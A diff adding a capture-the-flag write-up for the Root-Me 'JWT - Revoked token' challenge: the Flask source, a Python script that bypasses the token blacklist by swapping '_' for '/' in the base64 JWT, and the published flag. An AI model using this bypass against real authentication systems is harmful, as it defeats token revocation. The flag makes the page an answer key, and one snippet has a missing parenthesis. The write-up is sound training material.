@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [22/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [23/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -28,7 +28,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 20. [Directory traversal](#directory-traversal) 🗸
 21. [File upload - Null byte](#file-upload-null-byte) 🗸
 22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret) 🗸
-23. [JWT - Revoked token](#jwt-revoked-token)
+23. [JWT - Revoked token](#jwt-revoked-token) 🗸
 24. [PHP - assert()](#php-assert)
 25. [PHP - Filters](#php-filters)
 26. [PHP - register globals](#php-register-globals)
@@ -2350,7 +2350,197 @@ PleaseUseAStrongSecretNextTime
 ### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
 
 ---
-	
+
+
+## JWT Revoked token
+
+- Author: ArnC
+- Date: 20 March 2020
+- Points: 25
+- Level: 3
+
+### Statement
+
+Two endpoints are available :
+
+- POST : /web-serveur/ch63/login
+- GET : /web-serveur/ch63/admin
+
+Get an access to the admin endpoint.
+
+<details>
+
+<summary markdown="span">Source Code</summary>
+
+~~~py
+    #!/usr/bin/env python3
+    # -*- coding: utf-8 -*-
+    from flask import Flask, request, jsonify
+    from flask_jwt_extended import JWTManager, jwt_required, create_access_token, decode_token
+    import datetime
+    from apscheduler.schedulers.background import BackgroundScheduler
+    import threading
+    import jwt
+    from config import *
+     
+    # Setup flask
+    app = Flask(__name__)
+     
+    app.config['JWT_SECRET_KEY'] = SECRET
+    jwtmanager = JWTManager(app)
+    blacklist = set()
+    lock = threading.Lock()
+     
+    # Free memory from expired tokens, as they are no longer useful
+    def delete_expired_tokens():
+        with lock:
+            to_remove = set()
+            global blacklist
+            for access_token in blacklist:
+                try:
+                    jwt.decode(access_token, app.config['JWT_SECRET_KEY'],algorithm='HS256')
+                except:
+                    to_remove.add(access_token)
+           
+            blacklist = blacklist.difference(to_remove)
+     
+    @app.route("/web-serveur/ch63/")
+    def index():
+        return "POST : /web-serveur/ch63/login <br>\nGET : /web-serveur/ch63/admin"
+     
+    # Standard login endpoint
+    @app.route('/web-serveur/ch63/login', methods=['POST'])
+    def login():
+        try:
+            username = request.json.get('username', None)
+            password = request.json.get('password', None)
+        except:
+            return jsonify({"msg":"""Bad request. Submit your login / pass as {"username":"admin","password":"admin"}"""}), 400
+     
+        if username != 'admin' or password != 'admin':
+            return jsonify({"msg": "Bad username or password"}), 401
+     
+        access_token = create_access_token(identity=username,expires_delta=datetime.timedelta(minutes=3))
+        ret = {
+            'access_token': access_token,
+        }
+       
+        with lock:
+            blacklist.add(access_token)
+     
+        return jsonify(ret), 200
+     
+    # Standard admin endpoint
+    @app.route('/web-serveur/ch63/admin', methods=['GET'])
+    @jwt_required
+    def protected():
+        access_token = request.headers.get("Authorization").split()[1]
+        with lock:
+            if access_token in blacklist:
+                return jsonify({"msg":"Token is revoked"})
+            else:
+                return jsonify({'Congratzzzz!!!_flag:': FLAG})
+     
+     
+    if __name__ == '__main__':
+        scheduler = BackgroundScheduler()
+        job = scheduler.add_job(delete_expired_tokens, 'interval', seconds=10)
+        scheduler.start()
+        app.run(debug=False, host='0.0.0.0', port=5000)
+
+~~~
+
+</details>
+
+### Resources
+
+1. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
+2. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can initialise requests in python using the requests library:
+
+~~~py
+import requests
+URL = "http://challenge01.root-me.org/web-serveur/ch63/"
+login_page = "login"
+admin_page = "admin"
+
+username = "admin"
+password = "admin"
+
+login_data = {"username":username, "password": password}
+
+login_r = requests.post(URL+login_page, json = login_data)
+access_token = "0"
+admin_header = {'Authorization': "Bearer "+access_token}
+admin_r = requests.get(URL+admin_page,headers = admin_header)
+print(admin_r.content)
+~~~
+
+This provides a route for us to record the JWT:
+
+~~~py
+login_r = requests.post(URL+login_page, json = login_data
+access_token = login_r.content.decode().split(":")[1][1:-3]
+~~~
+
+Resubmitting this token, we get a rejection since this is in the blacklist as detailed in the source code.  We need to change the authentication token whilst maintaining the signature.  Appending "=" does not work since the signature does not match.  A peculiarity with base64 is "_" and "/" will be decompiled to the same value.  We can use this to find a JWT that includes a "_" and change it to a "/".  This will bypass the blacklist filter and maintain the JWT signature:
+
+~~~py
+import requests
+
+URL = "http://challenge01.root-me.org/web-serveur/ch63/"
+login_page = "login"
+admin_page = "admin"
+
+username = "admin"
+password = "admin"
+
+login_data = {"username":username, "password": password}
+
+underscore = False
+
+while underscore == False:
+    login_r = requests.post(URL+login_page, json = login_data)
+    access_token = login_r.content.decode().split(":")[1][1:-3]
+    if "_" in access_token:
+        access_token = access_token.split("_")
+        access_token = "/".join(access_token)
+        underscore = True
+    
+admin_header = {'Authorization': "Bearer "+access_token}
+admin_r = requests.get(URL+admin_page,headers = admin_header)
+print(admin_r.content)
+~~~
+
+This gives the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---	
+
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
